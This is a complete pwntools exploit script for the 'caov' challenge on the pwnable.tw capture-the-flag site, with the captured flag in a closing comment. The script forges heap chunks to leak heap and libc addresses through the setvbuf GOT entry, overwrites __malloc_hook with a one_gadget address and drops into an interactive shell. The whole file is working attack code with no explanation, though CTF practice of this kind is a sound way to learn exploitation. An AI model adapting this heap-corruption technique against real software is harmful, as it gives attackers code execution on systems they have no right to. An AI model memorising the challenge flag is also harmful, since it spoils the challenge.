from pwn import *

elf = ELF('caov')
libc = ELF("libc_64.so.6")
r = remote('chall.pwnable.tw', 10306)
one_gadget = 0xef6c4


def editnameshort(r, name):
    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'name: ', name)
    r.sendlineafter(b'length: ', b'0')


def editname(r, name, keylen, key, val):
    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'name: ', name)
    r.sendlineafter(b'length: ', str(keylen).encode())
    r.sendlineafter(b'Key: ', key)
    r.sendlineafter(b'Value: ', str(val).encode())
    r.recvuntil(b'Menu')


def editnamenoskip(r, name, keylen, key, val):
    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'name: ', name)
    r.sendlineafter(b'length: ', str(keylen).encode())
    r.sendlineafter(b'Key: ', key)
    r.sendlineafter(b'Value: ', str(val).encode())


# 4
with log.progress("leaking heap_base") as l:
    fakesmallchunk = p64(0) + p64(0x21) + b'\x00' * 16 + p64(0) + p64(0x20) + b'\x41' * 16 + b'\x41' * 32 + \
                     p64(0x6032d0) + b'\x41' * 24
    editchunk = p64(0) + p64(0x41) + p64(0) * 7 + p64(0x21) + b'\x41' * 16 + p64(0x6032d0)
    r.sendlineafter(b'name: ', b'CCCC')
    r.sendlineafter(b'key: ', b'\0' + b'a' * 0x36)
    r.sendlineafter(b'value: ', b'21')
    l.status("creating fake chunk")
    editname(r, fakesmallchunk, 0x17, b'a' * 0x16, 21)
    editnameshort(r, editchunk)
    r.recvuntil(b'after editing')
    r.recvuntil(b'Key: ')
    heapstr = r.recvuntil(b'\n')
    heap = heapstr[:len(heapstr) - 1] + b'\x00' * (9 - len(heapstr))
    heap_base = u64(heap)
    l.success(hex(heap_base))

r.recvuntil(b'Menu')

with log.progress("leaking libc_base") as l:
    editnamenoskip(r, p64(0) + b'A' * 88 + p64(heap_base + 0x50), 0x35, p64(elf.got['setvbuf']), 21)
    r.recvuntil(b'after editing')
    r.recvuntil(b'Key: ')
    libcstr = r.recvuntil(b'\n')
    libcstr = libcstr[:len(libcstr) - 1] + b'\x00' * (9 - len(libcstr))
    libc_base = u64(libcstr) - libc.sym['_IO_setvbuf']
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    shell = libc_base + one_gadget
    l.success(hex(libc_base))

r.recvuntil(b'Menu')
with log.progress("opening shell") as l:
    l.status("overwriting _malloc_hook")
    redochunk = p64(0) + p64(0x71) + p64(0) * 10 + p64(0x6032d0) + p64(0) * 2 + p64(0x21)
    changechunk = p64(0) + p64(0x71) + p64(malloc_hook - 0x23) + p64(0) * 9 + p64(0) * 3 + p64(0x21)
    editnameshort(r, redochunk)
    editnameshort(r, changechunk)
    editname(r, p64(0) + p64(0x71) + p64(malloc_hook - 0x23), 94, b'A' * 4, 21)
    editnamenoskip(r, p64(0) + p64(0x71) + p64(malloc_hook - 0x23), 94, b'A' * 19 + p64(shell), 21)
    l.success()
    r.interactive()

# FLAG --> FLAG{CAOV_stands_f0r_C0py_Ass1gnment_Operat0r_Vuln3rabil1ty_r3memb3r_alway5_r3turn_r3ference_typ3}
